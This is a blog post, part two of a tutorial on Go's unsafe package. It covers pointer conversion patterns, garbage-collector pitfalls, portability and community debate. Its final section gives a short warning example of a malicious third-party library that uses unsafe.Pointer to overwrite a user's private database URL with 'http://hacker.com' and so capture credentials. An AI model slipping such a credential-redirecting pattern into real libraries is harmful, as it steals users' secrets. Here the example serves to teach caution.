---
title: "Is unsafe ...unsafe? Pt. 2"
date: 2020-02-03T19:12:30+02:00
draft: false
image: https://media.giphy.com/media/SirldH9OfEP4c/giphy.gif
---
In the [last post](https://www.dnahurnyi.com/is-unsafe-...unsafe-pt.-1/), I have told about unsafe package details and functions. 
There is one type left unexplained

### [```type Pointer ```](https://golang.org/pkg/unsafe/#Pointer)<br/><br/> 
This type represents a pointer to an arbitrary type, which means that `unsafe.Pointer` can be converted to the pointer value of any type or `uintptr` and back. 
You might be guessing, are there any restrictions? No, and yes ... you can convert Pointer however you want but you have to deal with consequences. To reduce possible problems there are some patterns:

> "The following patterns involving Pointer are valid. Code not using these patterns is likely to be invalid today or to become invalid in the future. Even the valid patterns below come with important caveats.", [golang.org](https://golang.org/pkg/unsafe/#Pointer)

You can also use `go vet` to check some mistakes with `Pointer` usage, but it won't save you from all kinds of problems. So I recommend you to follow those patterns, this is the only way to reduce errors, this is the way...
![Gif](https://media.giphy.com/media/f9wiV1QYsy2tRp7mDP/giphy.gif)

### Fast copy

If you have 2 types that have the same memory layout, to avoid memory allocation you can copy the value of variable type `T1` to variable type `T2` by converting pointer of type `*T1` to the pointer of type `*T2` using next mechanism:
```
ptrT1 := &T1{}
ptrT2 = (*T2)(unsafe.Pointer(ptrT1))
```
But be careful, this conversion comes into the price, now 2 pointers point to the same memory address, so changes made from each pointer will be reflected on another pointer, [check it in the playground](https://play.golang.org/p/bZGEHrHp4LM)

### unsafe.Pointer != uintptr
I've already mentioned that `Pointer` can be converted to the `uintptr` and back, but there are some conditions regarding conversion back.
`unsafe.Pointer` is a real pointer, it does not only keeps memory address but the dynamic link to the address meanwhile `uintptr` is just a number, it's smaller but small size comes into the price. 
If you will convert `unsafe.Pointer` to the `uintptr` there could be no references to the pointed variable and [Garbage collector](https://en.wikipedia.org/wiki/Garbage_collection_(computer_science)) can easily collect that memory before you will convert `uintptr` back to the `unsafe.Pointer`.
There are at least 2 solutions to save you from GC, the first one is complex and really shows what price you have to pay for `unsafe` package usage. 
There is a special function, [`runtime.KeepAlive`](https://golang.org/pkg/runtime/#KeepAlive) that keeps memory of a passed variable from GC to the point where this function will be called. It sounds complex, it's even more complex in usage. 
[Check the example in the playground](https://play.golang.org/p/L7rgheqNo9w).

### Pointer arithmetic
There is the second way to save your forgotten variable from GC. You can convert `unsafe.Pointer` to the `uintptr` in the same expression. 
Since `uintptr` is just a number we can do all peculiar arithmetic operations like addition or subtraction. 
How can we use it? Using pointer arithmetic we can get any needed data knowing the memory layout and doing arithmetic operations.
Let's review the next example:
```
x := [4]byte{10, 11, 12, 13}
elPtr := unsafe.Pointer(uintptr(unsafe.Pointer(&x[0])) + 3*unsafe.Sizeof(x[0]))
```
Having pointer to the first element of the byte array we can get the second without indexes, just by shifting the pointer by the size of three bytes we can get the fourth element. Let me visualize:

![Pointer arithmetic](/img/Pointer-arithmetic.png)

[Check the example in the playground](https://play.golang.org/p/k4BJecT8pgf)

Doing all the conversions in one expression saves us from GC cleaning. 3 last patterns show how to properly convert `unsafe.Pointer` to other data types in different cases.

### Syscalls

In the package [`syscall`](https://golang.org/pkg/syscall/), we have a function [`syscall.Syscall`](https://golang.org/pkg/syscall/#Syscall) that receives pointers in `uintptr` format, so we can do this converting pointer value to `uintptr` through the `unsafe.Pointer`. 
Important note that you have to do the conversion with GC on your mind:
```
a := &A{1}
b := &A{2}
syscall.Syscall(0, uintptr(unsafe.Pointer(a)), uintptr(unsafe.Pointer(b))) // Right

aPtr := uintptr(unsafe.Pointer(a)
bPtr := uintptr(unsafe.Pointer(b)
syscall.Syscall(0, aPtr, bPtr) // Wrong
```
[Check the example in the playground](https://play.golang.org/p/HWLjCi0dnnF)

### [reflect.Value.Pointer](https://golang.org/pkg/reflect/#Value.Pointer) and [reflect.Value.UnsafeAddr](https://golang.org/pkg/reflect/#Value.UnsafeAddr)
There are 2 methods in package [`reflect`](https://golang.org/pkg/reflect/), Pointer and UnsafeAddr, they return `uintptr` as a result so we should immediately convert the result to `unsafe.Pointer` because of our friend - GC:
```
p1 := (*int)(unsafe.Pointer(reflect.ValueOf(new(int)).Pointer())) // Right

ptr := reflect.ValueOf(new(int)).Pointer() // Wrong
p2 := (*int)(unsafe.Pointer(ptr) // Wrong

```
[Check the example in the playground](https://play.golang.org/p/oB0flTtQx5h)

### [reflect.SliceHeader](https://golang.org/pkg/reflect/#SliceHeader) and [reflect.StringHeader](https://golang.org/pkg/reflect/#StringHeader)

There are 2 types in package [`reflect`](https://golang.org/pkg/reflect/), `SliceHeader` and `StringHeader` that have field `Data uintptr`. As you remember `uintptr` usually appears with `unsafe.Pointer`, here is the snippet:
```
var s string
hdr := (*reflect.StringHeader)(unsafe.Pointer(&s))
hdr.Data = uintptr(unsafe.Pointer(p))
hdr.Len = n
```
[Check the example in the playground](https://play.golang.org/p/Nj570I3p9Ko)

There were all possible patterns of `unsafe.Pointer` usage, all cases that don't follow those patterns or derivative from those patterns are likely invalid. 
But `unsafe` package brings problems not only in code but outside of it too. Let's review a couple of them.
![Problems](https://media.giphy.com/media/Lu94S7ZRGJ9mM/giphy.gif)
### Compatibility
Go has [compatibility guideline](https://golang.org/doc/go1compat) that guarantees saving compatibility with version updates. 
In plain words, it guarantees that your code will work after Go 1 version update...but not in case you've imported `unsafe` package. Usage of `unsafe` might break your code with every release, 
major, minor, even security patch. So before the import, just try to imagine a situation where your customer asks you why we can't patch Go version to remove vulnerability or why after update nothing works anymore.
### Different behavior
![int32 and int64](/img/Different-architectures.jpg)
Do you know all Go data types? Have you heard about `int`? Why do we have `int` if we already have `int32` and `int64`? 
The thing is `int` converts to `int32` to `int64` depending on computer architecture(x32 or x64 respectively). 
So just remember that `unsafe` functions results and memory layouts can be different on different architectures, for example:
```
var s string
unsafe.Sizeof(s) // 8 on x32 and 16 on x64
```
To be sure run [this code in the playground](https://play.golang.org/p/BsSRTqLJ6iY) and then try on your own machine, you should get different results if your architecture isn't x32.
### Community activity
I was wondering, if this package is so dangerous, how many daredevils are using it. I have searched that on [Github](https://github.com/search?l=Go&q=unsafe&type=Repositories). 
There were not many mentions comparing to the [crypto](https://github.com/search?l=Go&q=crypto&type=Repositories) or [math](https://github.com/search?l=Go&q=math&type=Repositories) and more than half of them were about tricks and deviations that you can produce using `unsafe`, not some real usage.
### Enthusiasts
There are many people and many thoughts, recently I have found [this article](https://nullprogram.com/blog/2019/06/30/) that shows a new approach to work with `int` and uses pointer operations, in short, it looks like this:
```
var foo int
fooslice = (*[1]int)(unsafe.Pointer(&foo))[:]
```
I won't provide my opinion for this construction, I will only mention that you should be ready for this kind of constructions once you have imported `unsafe`.
### Community pressure
Recently one accident happened in Rust community, long story short: One guy, Nikolay Kim, creator of [project actix](https://github.com/actix) under massive pressure from the community firstly made actix repositories private but later returned repos back, promoted one of the contributors to the owner and [left](https://github.com/actix/actix-web/issues/1289). 
All of that happened because some people thought that the usage of unsafe package was too dangerous. I understand, that didn't happen in Go community and there is no single right opinion about that. 
The only thing I want is to warn you, if you import `unsafe` in your code, be ready, community is coming🧨.

### One last thing
I personally tried to think about evil possibilities that `unsafe` provides, here is an example of a thief usage of `unsafe`.
Imagine you import some third-party package that does some convenient operation, like wrapping your DB client object and logger into one entity to make logging of all operation easier, or 
like in my example, some function that returns spiritual animal of your object...
```
package main

import (
	"fmt"
	"third-party/safelib"
)

func main() {
	a := safelib.NewA("https://google.com", "1234") // Url and password
	fmt.Println("My spiritual animal is: ", safelib.DoSomeHipsterMagic(a))
	a.Show()
}
```
Inside of that function we assert `interface{}` to some known type and fast copy to some `Malicious` type that has methods to get and set private fields like `url` and `password`. 
So this package can pull all interesting data or even substitute the url so next time you will try to connect to your DB someone will get your credentials.
```
func DoSomeHipsterMagic(any interface{}) string {
	if a, ok := any.(*A); ok {
		mal := (*Malicious)(unsafe.Pointer(a))
		mal.setURL("http://hacker.com")
	}

	return "Cool green dragon, arrh 🐉"
}
```
[Check out working example in playground](https://play.golang.org/p/JbeZNbaNW3R)

That was my review of `unsafe` package. 

### TL;DR
All technologies come into a certain price, but `unsafe` is very "expensive" so think twice before using it.